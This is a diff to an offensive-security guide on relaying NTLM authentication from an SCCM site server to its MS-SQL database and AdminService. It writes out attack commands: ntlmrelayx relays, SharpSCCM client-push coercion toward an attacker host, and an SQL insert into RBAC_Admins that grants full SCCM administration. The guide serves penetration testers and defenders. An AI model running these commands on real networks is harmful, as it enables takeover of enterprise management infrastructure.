@@ -120,10 +120,10 @@ From UNIX-like systems, [Impacket](https://github.com/fortra/impacket)'s [ntlmre
 
 ```bash
 # targetting MS-SQL
-ntlmrelayx.py -t "mssql://siteDatabase.domain.local" -smb2support -socks
+ntlmrelayx.py -t "mssql://siteDatabase.$DOMAIN" -smb2support -socks
 
 # targeting SMB
-ntlmrelayx.py -t "siteDatabase.domain.local" -smb2support -socks
+ntlmrelayx.py -t "siteDatabase.$DOMAIN" -smb2support -socks
 ```
 
 === Windows
@@ -149,7 +149,7 @@ There isn't any UNIX-like alternative to the `SharpSCCM.exe invoke client-push` 
 === Windows
 
 ```powershell
-SharpSCCM.exe invoke client-push -mp "SCCM-Server" -sc "$SITE_CODE" -t "attacker.domain.local"
+SharpSCCM.exe invoke client-push -mp "SCCM-Server" -sc "$SITE_CODE" -t "attacker.$DOMAIN"
 ```
 
 :::
@@ -161,7 +161,7 @@ The rest of this page is focusing on relaying the authentication on the MS-SQL s
 If the NTLM relay attack is a success and was targeting the MS-SQL service with SOCKS support, an SQL console could be obtained on the SCCM database through the opened socks proxy. From UNIX-like systems, [Impacket](https://github.com/fortra/impacket)'s [mssqlclient](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) (Python) can be used for that purpose.
 
 ```bash
-proxychains mssqlclient.py "DOMAIN/SCCM-Server$"@"siteDatabase.domain.local" -windows-auth
+proxychains mssqlclient.py "DOMAIN/SCCM-Server$"@"siteDatabase.$DOMAIN" -windows-auth
 ```
 
 Once the console is obtained, the attack can proceed to granting the user full privileges by running the following commands in the SQL console.
@@ -171,7 +171,7 @@ Once the console is obtained, the attack can proceed to granting the user full p
 use CM_<site_code>
 
 --Add the SID, the name of the current user, and the site code to the RBAC_Admins table
-INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (<SID_in_hex_format>,'DOMAIN\user',0,0,'','','','','<site_code>');
+INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (<SID_in_hex_format>,'$DOMAIN\$USER',0,0,'','','','','<site_code>');
 
 --Retrieve the AdminID of the added user
 SELECT AdminID,LogonName FROM RBAC_Admins;
@@ -195,6 +195,9 @@ Post exploitation via SCCM can now be performed on the network.
 
 ### Relay to the HTTP API AdminService
 
+> [!WARNING]
+> Starting with **Configuration Manager version 2509**, AdminService rejects NTLM authentication, which breaks this relay path. If you already hold valid admin credentials, authenticated abuse of the AdminService API remains possible.
+
 > [!CAUTION]
 > Some requirements are needed to perform the attack:
 > 
@@ -213,7 +216,7 @@ The target of the [NTLM relay attack](../../ntlm/relay.md) must be set to the SM
 From UNIX-like systems, [this PR](https://github.com/fortra/impacket/pull/1593) on [Impacket](https://github.com/fortra/impacket)'s [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) (Python) script can be used for that purpose.
 
 ```bash
-ntlmrelayx.py -t https://smsprovider.domain.local/AdminService/wmi/SMS_Admin -smb2support --adminservice --logonname "DOMAIN\USER" --displayname "DOMAIN\USER" --objectsid $OBJECTSID
+ntlmrelayx.py -t https://smsprovider.$DOMAIN/AdminService/wmi/SMS_Admin -smb2support --adminservice --logonname "DOMAIN\USER" --displayname "DOMAIN\USER" --objectsid $OBJECTSID
 ```
 
 === Windows
@@ -239,7 +242,7 @@ There isn't any UNIX-like alternative to the `SharpSCCM.exe invoke client-push` 
 === Windows
 
 ```powershell
-SharpSCCM.exe invoke client-push -mp "SCCM-Server" -sc "$SITE_CODE" -t "attacker.domain.local"
+SharpSCCM.exe invoke client-push -mp "SCCM-Server" -sc "$SITE_CODE" -t "attacker.$DOMAIN"
 ```
 
 :::
